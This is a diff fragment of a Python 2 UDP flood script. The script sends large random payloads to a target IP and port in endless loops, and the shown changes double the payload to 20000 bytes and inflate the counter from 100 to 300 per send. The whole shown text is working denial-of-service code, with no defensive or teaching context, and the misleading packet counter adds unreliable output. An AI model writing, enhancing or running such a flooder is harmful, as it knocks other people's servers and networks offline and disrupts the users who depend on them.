@@ -14,8 +14,8 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-bytes = random._urandom(10000)
-bytes1 = random._urandom(10000)
+bytes = random._urandom(20000)
+bytes1 = random._urandom(20000)
 system = platform.uname()[0]
 
 def cls():
@@ -38,13 +38,13 @@ sent = 0
 try:
    while True:
         sock.sendto(bytes, (ip,port))
-        sent = sent + 100
+        sent = sent + 300
         
         print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
         
         while True:
              sock.sendto(bytes1, (ip,port))
-             sent = sent + 100
+             sent = sent + 300
              
              print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
              
